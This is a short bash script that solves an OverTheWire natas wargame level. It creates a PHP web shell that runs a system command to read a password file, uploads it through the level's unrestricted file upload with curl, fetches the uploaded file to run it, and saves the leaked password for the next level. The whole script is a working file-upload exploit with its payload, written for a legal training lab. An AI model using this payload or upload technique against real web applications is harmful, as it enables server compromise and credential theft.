#!/bin/bash
url="http://natas12.natas.labs.overthewire.org"
user="natas12"
pass=$(cat credentials/natas12)

echo "<?php system('cat /etc/natas_webpass/natas13') ?>" > pwned.php
echo "[*] uploading malicious php file"
cat pwned.php

uploadfile=$(curl -s -X 'POST' -F 'uploadedfile=@pwned.php' -F 'filename=pwned.php' -u "$user:$pass" "$url" | html2text | grep  -oP '\(upload/.*?.php\)' | tr -d '()')

echo "File uploaded $uploadfile"

password=$(curl -s -u "$user:$pass" "$url/$uploadfile")

echo "[+] password found for natas13: $password"

echo $password > credentials/natas13

rm -f pwned.php
